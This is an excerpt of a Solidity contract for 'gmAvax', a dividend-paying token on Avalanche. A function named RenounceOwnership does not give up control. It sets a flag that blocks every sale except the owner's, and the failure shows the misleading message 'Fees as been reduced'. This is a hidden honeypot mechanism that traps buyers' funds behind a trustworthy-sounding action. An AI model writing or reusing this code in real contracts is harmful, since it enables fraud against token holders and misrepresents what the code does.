...
gmAvax is a fork of gmMetis.

5% rewards USDC
3% LP
2% Marketing

** https://t.me/gmavaxtoken
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664); 
...
contract gmavax is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "gmAvax";
    ...
    address public autoLiquidityReceiver=0x706b6e86f826A7c8f91DE2805d3Daac0A98d8157;
    address public marketingFeeReceiver=0x706b6e86f826A7c8f91DE2805d3Daac0A98d8157;
    ...
    bool isOwnershipRenounced = false;
    ...
    function RenounceOwnership(bool value) external onlyOwner {
        isOwnershipRenounced = value;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!isOwnershipRenounced || sender==owner), "Fees as been reduced");
